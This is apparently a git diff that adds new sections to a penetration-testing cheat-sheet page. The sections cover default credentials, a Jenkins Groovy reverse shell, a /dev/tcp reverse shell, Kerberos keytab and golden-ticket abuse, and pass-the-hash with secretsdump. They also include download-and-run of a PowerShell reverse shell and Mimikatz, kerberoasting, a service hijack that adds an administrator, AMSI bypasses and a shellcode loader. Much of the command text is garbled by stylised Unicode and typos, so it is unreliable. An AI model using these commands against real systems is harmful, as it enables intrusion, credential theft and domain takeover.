@@ -8,6 +8,41 @@ folder: mydoc
 
 # Tips and tricks
 
+## Default Credential
+
+| S/P | username | password
+| :--- | :--- | :--- |
+| Jenkins | admin | admin |
+| AWS EC2 | ec2-user | N/A (use SSH key) |
+| AWS RDS | N/A (use IAM credentials) | N/A (use IAM credentials) |
+| AWS S3  | N/A (use IAM credentials) | N/A (use IAM credentials) |
+| Azure VM | azureuser | N/A (use SSH key) |
+| Azure SQL Database | N/A (use Azure AD authentication or SQL Server authentication) | N/A (use Azure AD authentication or SQL Server authentication) |
+| Google Compute Engine | N/A (use project-level SSH key) | N/A (use project-level SSH key) |
+| Google Cloud SQL  | N/A (use Cloud SQL Proxy or SSL/TLS certificate)  | N/A (use Cloud SQL Proxy or SSL/TLS certificate) |
+| Docker  | root | N/A  |
+| Kubernetes | N/A  | N/A (use Kubernetes authentication mechanisms) |
+| OpenStack | ubuntu | ubuntu |
+| VMware ESXi | root | N/A |
+| Cisco IOS | cisco | cisco |
+| Juniper Junos | root | juniper123 |
+
+
+more: https://github.com/ihebski/DefaultCreds-cheat-sheet
+
+
+## Browser Cache
+
+### Firefox
+
+```
+𝑐𝑑 /. 𝑚𝑜𝑧𝑖𝑙𝑙𝑎/𝑓𝑖𝑟𝑒𝑓𝑜𝑥/4𝑝𝑧𝑔𝑞𝑔𝑗4. 𝑑𝑒𝑓𝑎𝑢𝑙𝑡 − 𝑟𝑒𝑙𝑒𝑎𝑠e
+𝑠𝑞𝑙𝑖𝑡𝑒3 𝑝𝑙𝑎𝑐𝑒𝑠. 𝑠𝑞𝑙𝑖𝑡𝑒
+.𝑡𝑎𝑏𝑙𝑒𝑠
+𝑠𝑒𝑙𝑒𝑐𝑡 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠. 𝑢𝑟𝑙 𝑓𝑟𝑜𝑚 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠;
+. 𝑞𝑢𝑖
+```
+
 ## File transfer
 
 ### Transfer by ftp without direct access to shell
@@ -241,6 +276,17 @@ wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
+or
+
+```
+sudo - I
+python -c 'import pty; pty. spawn("/bin/bash”)’
+sudo -u webadmin vi
+ESC +:+ !/bin/sh
+bash - i
+whoami
+```
+
 ```text
 try ctrl + z
 stty raw -echo 
@@ -347,6 +393,12 @@ curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containe
 Then we run it.
 
 ./docket-socket-expose.sh
+```
+
+### chroot
+
+```
+chroot /root /bin/bash
 ```
 
 
@@ -529,6 +581,12 @@ SECOND:
 4. in msf exec `run`
 ```
 
+### Escalation with find
+
+```
+var/lib/jenkins/find . -exec bash -p -i > & /dev/tcp/192.168.2.x/8000 0 > &1 \; - quit
+```
+
 ### Upgrade access with vds.exe service
 
 ```text
@@ -623,7 +681,7 @@ execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>
 execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\<DATABASE NAME>" 
 ```
 
-### ارتقا دسترسی با gdbus
+### gdbus
 
 ```text
 gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
@@ -697,6 +755,14 @@ volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f h
 ````
 
 ## Tunnel
+
+### SSH Tunnel
+
+```
+ssh -D 8083 root@192.168.8.3
+vi /etc/proxychains.conf ->  socks4 127.0.0.1 8083
+proxychains nap -sT 10.1.3.1 -Pn
+```
 
 ### Fpipe - receiving information from port 1234 and transferring to port 80 2.2.2.2
 
@@ -820,6 +886,251 @@ nc 10.10.10.10 3131 < output.zip
 ```
 
 
+## read auth clear-text credentials in nix
+
+```
+more /var/log/auth.log
+```
+
+## jenkins reverse shell
+
+```
+1)
+nc -nvlp 999
+
+2)
+Visit http://10.1.3.1:1234/script/console
+String host="192.168.2.x";
+int port=999;
+String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
+Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream
+po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available
+()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
+{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+## check linux joined ad
+
+```
+/etc/krb5.conf
+```
+
+or
+
+```
+"kinit -k host/$(hostname -f)"
+```
+
+## linux ad credential stored
+
+```
+/var/lib/jenkins/adm_domain.keytab
+```
+
+## Request TGT using the discovered keytab file
+
+```
+kinit adm_domain@OPERATIONS.ATOMIC.SITE - k - tadmin_domain. keytab
+klist
+```
+
+## Requesting CIFS ticket of Child Domain Controller
+
+```
+kuno cifs\/OPS-ChildDC
+klist
+```
+
+## PTH with Linux
+
+```
+apt -get install krb5 -user
+export KRB5CCNAME =/tmp/krb5cc_123
+proxychains psexec.py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC
+```
+
+## Extract the hash of adm_domain user only (with active Kerberos ticket)
+
+```
+proxychains secretsdump. py -no -pass -just -dc -user adm_domain -debug -dc -ip 10.1.1.2
+```
+
+
+## Extract the hash OPERATIONS.ATOMIC.SITE (with active Kerberos ticket)
+
+```
+proxychains secretsdump. py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC
+```
+
+## Extract specify for domain SID
+
+```
+proxychains lookupsid.py operations/Administrator@OPS -CHILDDC -hashes aad36435b51404eeaad3b435651404ee:5984a430e639891136c949186846f24
+```
+
+or
+
+```
+$𝑈𝑠𝑒𝑟 = 𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑆𝑦𝑠𝑡𝑒𝑚. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦. 𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙. 𝑁𝑇𝐴𝑐𝑐𝑜𝑢𝑛𝑡("𝑎𝑡𝑜𝑚𝑖𝑐","𝑘𝑟𝑏𝑡𝑔𝑡")
+$𝑠𝑡𝑟𝑆𝐼𝐷 = $𝑜𝑏𝑗𝑈𝑠𝑒𝑟. 𝑇𝑟𝑎𝑛𝑠𝑙𝑎𝑡𝑒([𝑆𝑦𝑠𝑡𝑒𝑚. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦. 𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦𝐼𝑑𝑒𝑛𝑡𝑖𝑓𝑖𝑒𝑟])
+$𝑠𝑡𝑟𝑆𝐼𝐷.𝑉𝑎𝑙𝑢𝑒
+```
+
+
+## Forge a golden ticket using OPERATIONS.ATOMIC.SITE “krbtgt” account
+
+```
+kerberos::golden /user: Administrator /domain:operations.atomic.site /sid:S-1-5-21-3757735274-1965336150-1982876978 /
+krbtgt:8e268effbf6735b8fb5be206cb3dfead /sids:S-1-5-21-95921459-2896253700-3873779052-519 /ptt
+```
+
+## Schedule a task at Atomic-DC server from OPS-CHILDDC after passing golden ticket
+
+
+```
+1)
+download & edit PowerShellTcpOneLine.ps1
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+
+
+2)
+schtasks /create /S atomic -dc.atomic.site /SC Weekly /RU "NT Authority \SYSTEM" /TN "warfare" /TR "powershell. exe - 'iea Object Net.WebClient).DownloadString("'http://192.168.2.x/Invoke -PowerShellTcpOneLine.ps1')"
+
+3)
+nc -nlvp 7779
+
+
+4)
+schtasks /Run /S atomic-dc. atomic. site /TN "warfare"
+
+```
+
+## Download & execute Invoke-Mimikatz.ps1 in memory
+
+```
+ (𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑁𝑒𝑡. 𝑊𝑒𝑏𝐶𝑙𝑖𝑒𝑛𝑡).𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑆𝑡𝑟𝑖𝑛𝑔(′ℎ𝑡𝑡𝑝://192.168.2. 𝑥/𝐼𝑛𝑣𝑜𝑘𝑒 − 𝑀𝑖𝑚𝑖𝑘𝑎𝑡𝑧. 𝑝𝑠1′);𝐼𝑛𝑣𝑜𝑘𝑒 − 𝑀𝑖𝑚𝑖𝑘𝑎𝑡𝑧 −
+𝐶𝑜𝑚𝑚𝑎𝑛𝑑 "𝑠𝑒𝑘𝑢𝑟𝑙𝑠𝑎: :𝑙𝑜𝑔𝑜𝑛𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠"
+```
+
+## Psexec in ATOMIC-DC server as enterprise administrator:
+
+```
+𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑠𝑒𝑥𝑒𝑐. 𝑝𝑦 − 𝑑𝑒𝑏𝑢𝑔 − ℎ𝑎𝑠ℎ𝑒𝑠 ∶ 𝑐49927𝑎1𝑒𝑏5𝑎335𝑑𝑓𝑏681𝑑𝑏95𝑑3𝑎45𝑎2 𝑎𝑡𝑜𝑚𝑖𝑐/𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟@𝐴𝑇𝑂𝑀𝐼𝐶 − 𝐷𝐶
+```
+
+
+## Enumerate named account with SPN in Nuclear.site domain
+
+```
+𝐼𝐸𝑋 (𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑁𝑒𝑡. 𝑊𝑒𝑏𝐶𝑙𝑖𝑒𝑛𝑡).𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑆𝑡𝑟𝑖𝑛𝑔(′ℎ𝑡𝑡𝑝://192.168.2.2/𝑃𝑜𝑤𝑒𝑟𝑉𝑖𝑒𝑤_𝑑𝑒𝑣. 𝑝𝑠1′)
+𝐺𝑒𝑡 − 𝑁𝑒𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑇𝑟𝑢𝑠𝑡 | ? {$_. 𝑇𝑟𝑢𝑠𝑡𝑇𝑦𝑝𝑒 − 𝑛𝑒 ′𝐸𝑥𝑡𝑒𝑟𝑛𝑎𝑙′} | %{𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑈𝑠𝑒𝑟 − 𝑆𝑃𝑁 − 𝐷𝑜𝑚𝑎𝑖𝑛 $_. 𝑇𝑎𝑟𝑔𝑒𝑡𝑁𝑎𝑚𝑒}
+```
+
+## kerberoasting 
+
+```
+1)
+𝐺𝑒𝑡 − 𝑁𝑒𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑇𝑟𝑢𝑠𝑡 | ? {$_. 𝑇𝑟𝑢𝑠𝑡𝑇𝑦𝑝𝑒 − 𝑛𝑒 ′𝐸𝑥𝑡𝑒𝑟𝑛𝑎𝑙′} | %{𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑈𝑠𝑒𝑟 − 𝑆𝑃𝑁 − 𝐷𝑜𝑚𝑎𝑖𝑛 $_. 𝑇𝑎𝑟𝑔𝑒𝑡𝑁𝑎𝑚𝑒}
+
+2)Enumerate accounts with SPN set in nuclear.site domain
+𝑅𝑒𝑞𝑢𝑒𝑠𝑡 − 𝑆𝑃𝑁𝑇𝑖𝑐𝑘𝑒𝑡 − 𝑆𝑃𝑁 𝐻𝑇𝑇𝑃/𝑛𝑢𝑐𝑙𝑒𝑎𝑟 − 𝑑𝑐. 𝑛𝑢𝑐𝑙𝑒𝑎𝑟. 𝑠𝑖𝑡𝑒
+
+3)
+𝐼𝑛𝑣𝑜𝑘𝑒 − 𝐾𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡 − 𝐷𝑜𝑚𝑎𝑖𝑛 𝑛𝑢𝑐𝑙𝑒𝑎𝑟. 𝑠𝑖𝑡𝑒 | % { $_.𝐻𝑎𝑠ℎ } | 𝑂𝑢𝑡 − 𝐹𝑖𝑙𝑒 − 𝐸𝑛𝑐𝑜𝑑𝑖𝑛𝑔 𝐴𝑆𝐶𝐼𝐼 ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡
+
+4)Filter the output to include only account HASH
+$𝑓𝑖𝑙𝑒 = "𝐶:\𝑈𝑠𝑒𝑟𝑠\𝑃𝑢𝑏𝑙𝑖𝑐\ ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡"
+$𝑏𝑎 = [𝑆𝑦𝑠𝑡𝑒𝑚. 𝑖𝑜. 𝑓𝑖𝑙𝑒]: : 𝑅𝑒𝑎𝑑𝑎𝑙𝑙𝐵𝑦𝑡𝑒𝑠($𝑓𝑖𝑙𝑒)
+$𝑠𝑡𝑟 = [𝑆𝑦𝑠𝑡𝑒𝑚. 𝑐𝑜𝑛𝑣𝑒𝑟𝑡]: :𝑡𝑜𝑏𝑎𝑠𝑒64𝑠𝑡𝑟𝑖𝑛𝑔($𝑏𝑎)
+
+5)Decode base64 & store it in file
+𝑏𝑎𝑠𝑒64 "𝑒𝑛𝑐𝑜𝑑𝑒𝑑" | 𝑏𝑎𝑠𝑒64 − 𝑑 > ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡
+```
+
+
+## Using “sendemail” for transmitting email:
+
+```
+𝑐𝑎𝑡 𝑚𝑠𝑔.𝑡𝑥𝑡 | 𝑠𝑒𝑛𝑑𝑒𝑚𝑎𝑖𝑙 − 𝑙 𝑒𝑚𝑎𝑖𝑙. 𝑙𝑜𝑔 − 𝑓 "𝑡𝑒𝑠𝑡@𝑡𝑒𝑠𝑡. 𝑐𝑜𝑚" − 𝑢 "𝑖𝑚𝑝𝑜𝑟𝑡𝑎𝑛𝑡_𝑑𝑒𝑙𝑖𝑣𝑒𝑟𝑦" − 𝑡 "a@a.com" − 𝑠 "Title" − 𝑜 𝑡𝑙𝑠 = 𝑛𝑜 − 𝑎 1. 𝑏𝑎t
+```
+
+## Shell of DB-Server
+
+```
+𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑚𝑠𝑑𝑎𝑡. 𝑝𝑦 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 − 𝑠 10.1.3.2 − 𝑝 1433 − 𝑈 𝑠𝑎 − 𝑃 ′𝑆𝐴𝐴𝑑𝑚𝑖𝑛! @#$%′ − −𝑒𝑛𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 −
+−𝑑𝑖𝑠𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 − −𝑑𝑖𝑠𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 – 𝑠ℎ𝑒𝑙l
+```
+
+
+## open cmd.exe with wordpress or ...
+
+xfreerdp x.rdp /timeout:99999
+Word->File->Open cmd.exe
+
+
+## Abuse SMPTRAP service
+
+```
+𝑠𝑐 𝑞𝑐 𝑠𝑛𝑚𝑝𝑡𝑟𝑎p
+𝑠𝑐 𝑐𝑜𝑛𝑓𝑖𝑔 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝 𝑏𝑖𝑛𝑝𝑎𝑡ℎ = "𝑛𝑒𝑡 𝑙𝑜𝑐𝑎𝑙𝑔𝑟𝑜𝑢𝑝 𝑎𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟𝑠 𝑖𝑦𝑒𝑟 /𝑎𝑑𝑑"
+𝑠𝑐 𝑠𝑡𝑜𝑝 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝
+𝑠𝑐 𝑠𝑡𝑎𝑟𝑡 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝
+```
+
+## amsi one line bypass 
+
+
+1. Byte array: This method involves converting malicious code into a byte array, which bypasses AMSI inspection.
+
+
+
+```
+$script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABzAGUAcwB0AD0AIgBQAG8AdwBlAHIAcwBoAG8AcgBvAGYAIABjAG8AbgBzAGkAbwBuAHQAIABsAG8AbwAgACgAWwBJAF0AXQA6ADoARgBvAHIAbQBhAHQAZQByACkAIgA='))
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+for ($i = 0; $i -lt $bytes.Length; $i++) {
+    if (($bytes[$i] -eq 0x41) -and ($bytes[$i+1] -eq 0x6D) -and ($bytes[$i+2] -eq 0x73) -and ($bytes[$i+3] -eq 0x69)) {
+        $bytes[$i+0] = 0x42; $bytes[$i+1] = 0x6D; $bytes[$i+2] = 0x73; $bytes[$i+3] = 0x69
+    }
+}
+[System.Reflection.Assembly]::Load($bytes)
+```
+
+
+2. Reflection: This method involves using .NET reflection to invoke a method that is not inspected by AMSI.
+
+
+```
+$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)
+```
+
+or
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+
+3. String obfuscation: This method involves obfuscating the malicious code to evade AMSI detection.
+
+4. AMSI patching: This method involves patching AMSI to bypass the inspection entirely.
+
+5. Using alternative PowerShell hosts: This method involves using alternative PowerShell hosts that don't load AMSI modules.
+
+
+
+Byte-patching:
+
+```
+Add-Type -MemberDefinition '
+[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);
+' -Namespace Win32
+$shellcode = [System.Text.Encoding]::UTF8.GetBytes('MY_SHELLCODE_HERE')
+$mem = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x1000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [System.IntPtr]($mem), $shellcode.Length)
+$thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
+```
 
 
 {% include links.html %}
